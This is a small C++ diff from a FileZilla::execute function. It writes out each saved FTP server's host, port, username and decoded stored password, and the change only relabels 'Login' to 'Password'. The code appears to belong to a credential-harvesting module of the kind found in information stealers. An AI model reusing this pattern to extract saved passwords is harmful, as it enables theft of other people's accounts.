@@ -22,7 +22,7 @@ void FileZilla::execute(fs::path &root) {
 
         ss << "Url: " << "ftp://" << server.host << ":" << std::to_string(server.port) << "/" << "\n";
         ss << "Username: " << server.user << "\n";
-        ss << "Login: " << std::string(decodedPass.begin(), decodedPass.end()) << "\n";
+        ss << "Password: " << std::string(decodedPass.begin(), decodedPass.end()) << "\n";
         ss << "\n";
     }
 
